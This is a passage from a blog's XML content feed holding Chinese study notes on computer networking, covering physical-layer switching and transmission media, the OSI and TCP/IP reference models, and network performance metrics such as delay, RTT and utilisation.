<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190116678-167279258884018.png" alt>编码：10011010<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190143154-167279259042619.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190230580-167279259223120.png" alt>编码：10011010<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190246207-167279259347221.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103191801785-167279259538422.png" alt><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192125822-167279259694523.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192208870-167279259863824.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192521027-167279260275625.png" alt><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192445031-167279260467126.png" alt></p>
<h3 id="数字数据调制为模拟信号"><a href="#数字数据调制为模拟信号" class="headerlink" title="数字数据调制为模拟信号"></a>数字数据调制为模拟信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192754829-167279260696627.png" alt></p>
<h3 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193529027-167279261051728.png" alt></p>
<ol>
<li><p>抽样</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193649691-167279261262129.png" alt></p>
</li>
<li><p>量化</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193712185-167279261420230.png" alt></p>
</li>
<li><p>编码</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193746901-167279261633531.png" alt></p>
</li>
</ol>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193851839-167279261751432.png" alt></p>
<h3 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103194601850-167279261920833.png" alt></p>
<h2 id="数据交换方式"><a href="#数据交换方式" class="headerlink" title="数据交换方式"></a>数据交换方式</h2><h3 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103195427418-167279262085434.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103195617523-167279262199435.png" alt></p>
<p>特点：独占资源，用户始终占用端对端的固定传输带宽，适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103195959354-167279262392236.png" alt></p>
<h3 id="报文交换"><a href="#报文交换" class="headerlink" title="报文交换"></a>报文交换</h3><p>报文：网络中交换与传输的数据单元，即站点一次性要发送的数据块。报文包含了将要发送的完整的数据信息，其长短很不一致，长度不限且可变。</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200303274-167279262636437.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200520863-167279262796638.png" alt></p>
<p>优点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200620703-167279262981139.png" style="zoom: 80%;"></p>
<p>缺点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200647901-167279263147840.png" style="zoom:80%;"></p>
<h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><p>分组：大多数计算机网络都不能连续的传送任意长数据，所以实际上网络系统把数据分割成小块，然后逐块的发送，这种小块就称作分组<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200957655-167279263306641.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201033840-167279263439242.png" alt></p>
<p>优点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201320054-167279263603943.png" style="zoom:80%;"></p>
<p>缺点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201237096-167279263757844.png" style="zoom:80%;"></p>
<h4 id="数据报方式"><a href="#数据报方式" class="headerlink" title="数据报方式"></a>数据报方式</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201820163-167279263917245.png" alt></p>
<p>无连接服务：不事先为分组的传输确定传输路径，每个分组独立确定传输路径，不同分组传输路径可能不同。</p>
<p>特点</p>
<ol>
<li>数据报方式为网络层提供无连接服务。发送方可随时发送分组，网络中的结点可随时接受分组。</li>
<li>同一报文的不同分组达到目的结点时可能发生乱序、重复与丢失。</li>
<li>每个分组在传输过程中都必须携带源地址和目的地址，以及分组号。</li>
<li>分组在交换结点存储转发时，需要排队等候处理，这会带来一定时延，当通过交换结点的通信量较大或网络发生拥塞时，这种时延会大大增加，交换结点还可根据情况丢弃部分分组。</li>
<li>网络具有冗余路径，当某一交换结点或一段链路出现故障时，可相应地更新转发表，寻找另一条路径转发分组，对故障适应能力强，适用于突发性通信，不适用于长报文、会话式通信。</li>
</ol>
<h4 id="虚电路方式"><a href="#虚电路方式" class="headerlink" title="虚电路方式"></a>虚电路方式</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103203057644-167279264105646.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103203209520-167279264267547.png" alt></p>
<p>连接服务：首先为分组的传输确定传输路径（建立连接），然后沿该路径（连接）传输系列分组，系列分组传输路径相同，传输结束后拆除连接‘</p>
<p>特点</p>
<ol>
<li>虚电路方式为网络层提供连接服务。源结点与目的结点之间建立一条逻辑连接，而非实际物理连接。</li>
<li>一次通信的所有分组都通过虚电路顺序传送，分组不需携带源地址、目的地址等信息，包含虚电路号，相对数据报方式开销小，同一报文的不同分组到达目的结点时不会乱序、重复或丢失</li>
<li>分组通过虚电路上的每个结点时，结点只进行差错检测，不需进行路由选择。</li>
<li>每个结点可能与多个结点之间建立多条虚电路，每条虚电路支持特定的两个端系统之间的数据传输，可以对两个数据端点的流量进行控制，两个端系统之间也可以有多条虚电路为不同的进程服务</li>
<li>致命弱点：当网络中某个结点或某个链路出故障而彻底失效时，所有经过该结点或该链路的虚电路将遭到破坏。</li>
</ol>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103204131257-167279264450448.png" alt></p>
<h2 id="数据交换方式的选择"><a href="#数据交换方式的选择" class="headerlink" title="数据交换方式的选择"></a>数据交换方式的选择</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201454934-167279264604849.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201550842-167279264788350.png" style="zoom:80%;"></p>
<h2 id="物理层传输介质"><a href="#物理层传输介质" class="headerlink" title="物理层传输介质"></a>物理层传输介质</h2><p>数据传输系统中在发送设备和接受设备之间的物理通路，传输介质也称传输媒体/传输媒介<br>传输媒体并不是物理层</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103204641991-167279264968351.png" alt></p>
<h3 id="导向传输介质"><a href="#导向传输介质" class="headerlink" title="导向传输介质"></a>导向传输介质</h3><h4 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h4><p>两根采用一定规则并排绞合的、相互绝缘的铜导线组成<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103204758526-167279265123552.png" alt><br>绞合可以减少对相邻导线的电磁干扰。<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205007478-167279265309853.png" alt></p>
<h4 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205047225-167279265478454.png" alt></p>
<h4 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205458461-167279265652955.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205636018-167279265813256.png" alt></p>
<h3 id="非导向性传输介质"><a href="#非导向性传输介质" class="headerlink" title="非导向性传输介质"></a>非导向性传输介质</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103210133968-167279265980857.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103210940343-167279266092058.png" alt><br>红外线、激光：把要传输的信号分别转换为各自的信号格式，即红外光信号和激光信号，再在空间中传播。信号固定方向传播。</p>
<h2 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h2><h3 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103211523981-167279266307859.png" alt></p>
<p>中继器的功能：对信号进行再生和还原，对衰减的信号进行放大，保持与源数据相同，以增加信号传输的距离，延长网络长度。’</p>
<p>中继器的两端：两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103211756115-167279266471260.png" alt><br>中继器两端的网段一定要是同一个协议。</p>
<p>5-4-3规则：网络标准中都对信号的延迟范围做了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障</p>
<h3 id="集线器（多口中继器）"><a href="#集线器（多口中继器）" class="headerlink" title="集线器（多口中继器）"></a>集线器（多口中继器）</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103212138463-167279266705861.png" style="zoom:80%;"></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103212118380-167279267072462.png" alt></p>
<p>集线器不能分割冲突域——》连在集线器上的工作主机平分带宽</p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>体系结构&amp;参考模型</title>
    <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&amp;%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
<span id="more"></span>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231141405853-16727927031211.png" alt></p>
<p>对等实体之间才有协议，下层为上层提供服务</p>
<h3 id="分层的基本原则"><a href="#分层的基本原则" class="headerlink" title="分层的基本原则"></a>分层的基本原则</h3><ol>
<li>各层之间相互独立，每层只实现一种相对独立的功能</li>
<li>每层之间界面自然清晰，易于理解，互相交流尽可能少</li>
<li>结构上可分割开。每层都采用最合适的技术来实现</li>
<li>保持下层对上层的对立性，上层单向使用下层提供的服务</li>
<li>整个分层结构应该能促进标准化工作</li>
</ol>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231142532860-16727928089353.png" alt></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231142748644-16727927211942.png" style="zoom: 67%;"><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231142709447.png" style="zoom:80%;"></p>
<h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><ul>
<li>网络体系结构是从<strong>功能</strong>上描述计算机网络结构</li>
<li>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong></li>
<li>每层遵守某个/些<strong>网络协议</strong>以完成本层功能</li>
<li>计算机网络体系结构是计算机网络的各层及其协议的集合</li>
<li>第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能</li>
<li>仅仅在相邻层间有接口，且所提供的服务的具体实现细节对上一层完全屏蔽（透明）</li>
<li>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件</li>
</ul>
<h1 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h1><h3 id="7层OSI参考模型"><a href="#7层OSI参考模型" class="headerlink" title="7层OSI参考模型"></a>7层OSI参考模型</h3><p>目标：支持异构网络系统的互联互通</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231165655402-16727928342534.png" alt="image-20221231165655402" style="zoom:80%;"></p>
<h3 id="ISO-OSI参考模型解释通信过程"><a href="#ISO-OSI参考模型解释通信过程" class="headerlink" title="ISO/OSI参考模型解释通信过程"></a>ISO/OSI参考模型解释通信过程</h3><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102091707835-16727928362615.png" alt="image-20230102091707835"></p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能和用户交互产生网络流量的程序（eg：qq，163邮箱）</p>
<h4 id="典型应用层服务："><a href="#典型应用层服务：" class="headerlink" title="典型应用层服务："></a>典型应用层服务：</h4><p>文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在两个通信系统中交换信息的表示方式（语法和语义）</p>
<p>功能一：数据格式变换<br>功能二：数据加密解密<br>功能三：数据压缩和恢复</p>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供建立连接并在连接上有序的传输数据。<br>这是绘画，也是<strong>建立同步</strong>（SYN）</p>
<p>功能一：建立、管理、终止会话<br>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。<br>——适用于传输大文件</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报。</p>
<p>功能一：可靠传输、不可靠传输<br>功能二：差错控制<br>功能三：流量控制<br>功能四：复用分用</p>
<p>主要协议：TCP，UDP</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层成本传输单位是数据报</p>
<p>功能一：路由选择<br>功能二：流量控制<br>功能三：差错控制<br>功能四：拥塞控制</p>
<p>主要协议：IP、IPX、ICMP</p>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。<br>数据链路层的传输单位是帧</p>
<p>功能一：成帧（定义帧的开始和结束）<br>功能二：差错控制<br>功能三：流量控制<br>功能四：访问（接入）控制：控制对信道的访问</p>
<p>主要协议：PPP</p>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在物理媒体上实现比特流的透明传输<br>物理层传输单位是比特</p>
<p>透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送</p>
<p>功能一：定义接口特性<br>功能二：定义传输模式（单工、半双工、双工）<br>功能三：定义传输速率<br>功能四：比特同步<br>功能五：比特编码</p>
<p>主要协议：Rj45、802.3</p>
<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102153143474-16727928405746.png" alt="image-20230102153143474"></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
<h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>体系结构&amp;参考模型</title>
    <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
<span id="more"></span>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231141405853-16727927031211.png" alt></p>
<p>对等实体之间才有协议，下层为上层提供服务</p>
<h3 id="分层的基本原则"><a href="#分层的基本原则" class="headerlink" title="分层的基本原则"></a>分层的基本原则</h3><ol>
<li>各层之间相互独立，每层只实现一种相对独立的功能</li>
<li>每层之间界面自然清晰，易于理解，互相交流尽可能少</li>
<li>结构上可分割开。每层都采用最合适的技术来实现</li>
<li>保持下层对上层的对立性，上层单向使用下层提供的服务</li>
<li>整个分层结构应该能促进标准化工作</li>
</ol>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142532860-16727928089353.png" alt></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142748644-16727927211942.png" style="zoom: 67%;"><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142709447.png" style="zoom:80%;"></p>
<h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><ul>
<li>网络体系结构是从<strong>功能</strong>上描述计算机网络结构</li>
<li>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong></li>
<li>每层遵守某个/些<strong>网络协议</strong>以完成本层功能</li>
<li>计算机网络体系结构是计算机网络的各层及其协议的集合</li>
<li>第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能</li>
<li>仅仅在相邻层间有接口，且所提供的服务的具体实现细节对上一层完全屏蔽（透明）</li>
<li>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件</li>
</ul>
<h1 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h1><h3 id="7层OSI参考模型"><a href="#7层OSI参考模型" class="headerlink" title="7层OSI参考模型"></a>7层OSI参考模型</h3><p>目标：支持异构网络系统的互联互通</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231165655402-16727928342534.png" alt="image-20221231165655402" style="zoom:80%;"></p>
<h3 id="ISO-OSI参考模型解释通信过程"><a href="#ISO-OSI参考模型解释通信过程" class="headerlink" title="ISO/OSI参考模型解释通信过程"></a>ISO/OSI参考模型解释通信过程</h3><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102091707835-16727928362615.png" alt="image-20230102091707835"></p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能和用户交互产生网络流量的程序（eg：qq，163邮箱）</p>
<h4 id="典型应用层服务："><a href="#典型应用层服务：" class="headerlink" title="典型应用层服务："></a>典型应用层服务：</h4><p>文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在两个通信系统中交换信息的表示方式（语法和语义）</p>
<p>功能一：数据格式变换<br>功能二：数据加密解密<br>功能三：数据压缩和恢复</p>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供建立连接并在连接上有序的传输数据。<br>这是绘画，也是<strong>建立同步</strong>（SYN）</p>
<p>功能一：建立、管理、终止会话<br>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。<br>——适用于传输大文件</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报。</p>
<p>功能一：可靠传输、不可靠传输<br>功能二：差错控制<br>功能三：流量控制<br>功能四：复用分用</p>
<p>主要协议：TCP，UDP</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层成本传输单位是数据报</p>
<p>功能一：路由选择<br>功能二：流量控制<br>功能三：差错控制<br>功能四：拥塞控制</p>
<p>主要协议：IP、IPX、ICMP</p>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。<br>数据链路层的传输单位是帧</p>
<p>功能一：成帧（定义帧的开始和结束）<br>功能二：差错控制<br>功能三：流量控制<br>功能四：访问（接入）控制：控制对信道的访问</p>
<p>主要协议：PPP</p>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在物理媒体上实现比特流的透明传输<br>物理层传输单位是比特</p>
<p>透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送</p>
<p>功能一：定义接口特性<br>功能二：定义传输模式（单工、半双工、双工）<br>功能三：定义传输速率<br>功能四：比特同步<br>功能五：比特编码</p>
<p>主要协议：Rj45、802.3</p>
<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153143474-16727928405746.png" alt="image-20230102153143474"></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
<h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>性能指标</title>
    <url>/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>速率、带宽、吞吐量、时延、时延带宽积、往返时延RTT、利用率</p>
<span id="more"></span>
<h3 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h3><p>速率即<strong>数据率</strong>或称<strong>数据传输率</strong>或<strong>比特率</strong><br><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231100931394-16727929048181.png" alt="image-20221231100931394"></p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231101133151-16727929066852.png" alt="image-20221231101133151"></p>
<h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><p>表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的<strong>“最高数据率”</strong>。单位是“比特每秒”，b/s，kb/s，Mb/s，Gb/s</p>
<h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><p>表示单位时间内通过某个网络（或信道、接口）的数据率，单位b/s，kb/s，Mb/s等<br>吞吐量受网络的带宽或网络的额定速率的限制S</p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231103536362-16727929083683.png" alt="image-20221231103536362"></p>
<h3 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h3><p>指数据（报文/分组/比特流）从网络（或链路）的一段传送到另一端所需的时间。也叫延迟或者迟延，单位是s。</p>
<h4 id="发送时延"><a href="#发送时延" class="headerlink" title="发送时延"></a>发送时延</h4><script type="math/tex; mode=display">
发送时延=\frac{数据长度}{信道带宽(发送速率)}</script><p>高速链路指提高发送速率</p>
<h4 id="传播时延"><a href="#传播时延" class="headerlink" title="传播时延"></a>传播时延</h4><p>却决于电磁波传播速度和链路长度</p>
<script type="math/tex; mode=display">
传播时延=\frac{信道长度}{电磁波在信道上的传播速率}</script><h4 id="排队时延"><a href="#排队时延" class="headerlink" title="排队时延"></a>排队时延</h4><p>等待输出/入，链路可用</p>
<h4 id="处理时延"><a href="#处理时延" class="headerlink" title="处理时延"></a>处理时延</h4><p>检错，找出口</p>
<h3 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h3><p>时延带宽积=传播时延×带宽，单位是bit</p>
<h3 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h3><p>从发送方发送数据开始，到发送方收到接收方的确认，总共经历的时延</p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231134859185-16727929121454.png" alt="image-20221231134859185"></p>
<p>RTT越大，在收到确认之前，可以发送的数据越多</p>
<script type="math/tex; mode=display">
RTT包括\begin{cases}往返传播时延=传播时延*2\\末端处理时间\end{cases}</script><h3 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h3><h4 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h4><p>$信道利用率=\frac{有数据通过时间}{(有+无)数据通过时间}$</p>
<h4 id="网络利用率"><a href="#网络利用率" class="headerlink" title="网络利用率"></a>网络利用率</h4><p>信道利用率加权平均值</p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231140430417-16727929147615.png" alt="image-20221231140430417"></p>
<p>eg：假定网络利用率达到了80%，则估算现在的网络时延是最小值的___？<br>利用率有信道利用率和网络利用率两种。信道利用率指出某信道有百分之几百的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。网络利用率则是全网络的信道利用率的加权平均值。信道利用率并非越高越好。这是因为，根据排队的理论，当某信道的利用率增大时，该信道引起的时延也就迅速增加。当网络的通信量很少时，网络产生的时延并不大。但在网络通信量不断增大的情况下，由于分组在网络结点（路由器或结点交换机）进行处理时需要排队等候，因此网络引起的时延就会增大。如果令D0表示网络空闲时的时延，D表示网络当前的时延，那么适当的假定条件下，可以用下面的简单公式来表示D，D0和利用率U之间的关系:<br>D=D0/(1-U)那么,<br>网络时延最小值就是空闲时为D0;<br>当网络利用率达80%,则D=D0/(1-80%)=D0/0.2=5D0;</p>
<p>所以是最小值的5倍</p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>认识计算机网络</title>
    <url>/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>计算机网络的概念，功能，组成，分类</p>
<span id="more"></span>
<p>RTT:往返传播时延      </p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230185354019-16727929437801.png" alt="image-20221230185354019"></p>
